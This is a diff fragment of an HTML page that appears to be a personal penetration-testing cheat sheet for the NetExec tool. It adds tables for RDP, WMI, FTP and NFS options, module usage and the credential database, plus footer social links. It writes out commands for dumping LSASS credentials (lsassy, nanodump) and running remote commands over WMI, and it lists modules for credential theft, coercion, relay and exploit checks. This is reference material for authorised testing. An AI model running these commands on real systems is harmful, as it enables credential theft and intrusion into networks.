+<td><code>rdp</code></td>
+<td><code>--nla-screenshot</code></td>
+<td>Capture the NLA screen where accessible.</td>
+</tr>
+<tr>
+<td><code>wmi</code></td>
+<td><code>--local-auth</code></td>
+<td>Authenticate with a local Windows account.</td>
+</tr>
+<tr>
+<td><code>wmi</code></td>
+<td><code>-x '&lt;cmd&gt;'</code></td>
+<td>Execute through WMI.</td>
+</tr>
+<tr>
+<td><code>ftp</code></td>
+<td><code>--ls</code></td>
+<td>List the FTP working directory.</td>
+</tr>
+<tr>
+<td><code>ftp</code></td>
+<td><code>--get &lt;remote&gt;</code></td>
+<td>Download a file.</td>
+</tr>
+<tr>
+<td><code>ftp</code></td>
+<td><code>--put &lt;local&gt; &lt;remote&gt;</code></td>
+<td>Upload a file.</td>
+</tr>
+<tr>
+<td><code>nfs</code></td>
+<td><code>--shares</code></td>
+<td>List NFS exports.</td>
+</tr>
+<tr>
+<td><code>nfs</code></td>
+<td><code>--share &lt;path&gt; --ls '/'</code></td>
+<td>List a selected export.</td>
+</tr>
+<tr>
+<td><code>nfs</code></td>
+<td><code>--share &lt;path&gt; --enum-shares 5</code></td>
+<td>Enumerate export depth.</td>
+</tr>
+<tr>
+<td><code>nfs</code></td>
+<td><code>--share &lt;path&gt; --get-file &lt;remote&gt; &lt;local&gt;</code></td>
+<td>Download from an export.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="modules">Modules<a class="headerlink" href="#modules" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>-L
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span>-M<span class="w"> </span>lsassy<span class="w"> </span>--options
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-M<span class="w"> </span>lsassy
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-u<span class="w"> </span>admin<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;...&#39;</span><span class="w"> </span>-M<span class="w"> </span>nanodump<span class="w"> </span>-o<span class="w"> </span><span class="nv">TMP_DIR</span><span class="o">=</span><span class="s1">&#39;C:\\Windows\\Temp&#39;</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-L</code></td>
+<td>List modules for the selected protocol.</td>
+</tr>
+<tr>
+<td><code>-M &lt;module&gt;</code></td>
+<td>Run a module. Repeat <code>-M</code> to chain modules.</td>
+</tr>
+<tr>
+<td><code>--options</code></td>
+<td>Show module options.</td>
+</tr>
+<tr>
+<td><code>-o KEY=VALUE</code></td>
+<td>Pass module options.</td>
+</tr>
+</tbody>
+</table>
+<p>High-value modules to keep in rotation:</p>
+<table>
+<thead>
+<tr>
+<th>Area</th>
+<th>Modules</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>LSASS / host creds</td>
+<td><code>lsassy</code>, <code>nanodump</code>, <code>procdump</code>, <code>ntdsutil</code></td>
+</tr>
+<tr>
+<td>SYSVOL / app creds</td>
+<td><code>gpp_password</code>, <code>gpp_autologin</code>, <code>mremoteng</code>, <code>mobaxterm</code>, <code>putty</code>, <code>rdcman</code>, <code>firefox</code></td>
+</tr>
+<tr>
+<td>AD object / cert abuse</td>
+<td><code>adcs</code>, <code>certipy-find</code>, <code>daclread</code>, <code>maq</code>, <code>pre2k</code>, <code>badsuccessor</code></td>
+</tr>
+<tr>
+<td>Coercion / relay</td>
+<td><code>coerce_plus</code>, <code>petitpotam</code>, <code>printerbug</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>mssql_priv</code>, <code>enum_links</code>, <code>enum_impersonate</code>, <code>mssql_coerce</code></td>
+</tr>
+<tr>
+<td>Vuln checks</td>
+<td><code>zerologon</code>, <code>nopac</code>, <code>printnightmare</code>, <code>ms17-010</code>, <code>ntlm_reflection</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="credential-database">Credential Database<a class="headerlink" href="#credential-database" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>nxcdb
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>nxcdb<span class="w"> </span><span class="o">(</span>default<span class="o">)</span>&gt;<span class="w"> </span>workspace<span class="w"> </span>create<span class="w"> </span>engagement-q2-2026
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>nxcdb<span class="w"> </span><span class="o">(</span>default<span class="o">)</span>&gt;<span class="w"> </span>workspace<span class="w"> </span>engagement-q2-2026
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>nxcdb<span class="w"> </span><span class="o">(</span>engagement-q2-2026<span class="o">)</span>&gt;<span class="w"> </span>proto<span class="w"> </span>smb
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>nxcdb<span class="w"> </span><span class="o">(</span>engagement-q2-2026<span class="o">)(</span>smb<span class="o">)</span>&gt;<span class="w"> </span>creds
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>nxcdb<span class="w"> </span><span class="o">(</span>engagement-q2-2026<span class="o">)(</span>smb<span class="o">)</span>&gt;<span class="w"> </span>hosts
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>nxcdb<span class="w"> </span><span class="o">(</span>engagement-q2-2026<span class="o">)(</span>smb<span class="o">)</span>&gt;<span class="w"> </span><span class="nb">export</span><span class="w"> </span>creds<span class="w"> </span>detailed<span class="w"> </span>creds.csv
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>nxcdb<span class="w"> </span><span class="o">(</span>engagement-q2-2026<span class="o">)(</span>smb<span class="o">)</span>&gt;<span class="w"> </span><span class="nb">export</span><span class="w"> </span>shares<span class="w"> </span>simple<span class="w"> </span>shares.csv
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.10<span class="w"> </span>-id<span class="w"> </span><span class="m">7</span>
+</code></pre></div>
+<p>Workspaces live under <code>~/.nxc/workspaces</code>. Keep client workspaces separate.</p>
+<hr />
+<h2 id="operational-notes">Operational Notes<a class="headerlink" href="#operational-notes" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Output and dumps land under <code>~/.nxc/logs/</code>; pull artifacts from there instead of scraping stdout.</li>
+<li>Add <code>--log run.log</code> for one command, or set <code>log_mode = True</code> in <code>~/.nxc/nxc.conf</code>.</li>
+<li>Set <code>audit_mode = #</code> in <code>~/.nxc/nxc.conf</code> when screen-sharing or recording.</li>
+<li>Default threading is aggressive. Drop to <code>-t 50</code> over VPN/SOCKS or fragile links.</li>
+<li>Through SOCKS, DCOM execution (<code>wmiexec</code>, <code>mmcexec</code>) is unreliable. Try <code>--exec-method atexec</code> or <code>smbexec</code>.</li>
+<li>When the LM half is <code>aad3...</code>, paste only the NT hash.</li>
+</ul>
 
 
 
@@ -4457,10 +5646,37 @@
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">
   
+    <div class="md-copyright__highlight">
+      Copyright &copy; Taylor Elder
+    </div>
   
-    Made with
-    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
-      Material for MkDocs
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://taylorelder.com" target="_blank" rel="noopener" title="Portfolio — taylorelder.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M352 256c0 22.2-1.2 43.6-3.3 64H163.3c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64h185.4c2.2 20.4 3.3 41.8 3.3 64zm28.8-64h123.1c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64H380.8c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32H376.7c-10-63.9-29.8-117.4-55.3-151.6 78.3 20.7 142 77.5 171.9 151.6zm-149.1 0H167.7c6.1-36.4 15.5-68.6 27-94.7 10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5 11.6 26 20.9 58.2 27 94.7zm-209 0H18.6c30-74.1 93.6-130.9 172-151.6-25.5 34.2-45.3 87.7-55.3 151.6zM8.1 192h123.1c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64H8.1C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zm186.6 254.6c-11.6-26-20.9-58.2-27-94.6h176.6c-6.1 36.4-15.5 68.6-27 94.6-10.5 23.6-22.2 40.7-33.5 51.5-11.2 10.7-20.5 13.9-27.8 13.9s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6-78.4-20.7-142-77.5-172-151.6h116.7zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6 25.5-34.2 45.2-87.7 55.3-151.6h116.6z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://github.com/aelder202" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/taylor-elder/" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
     </a>
   
 </div>
@@ -4475,7 +5691,7 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.3220b9d7.min.js"></script>
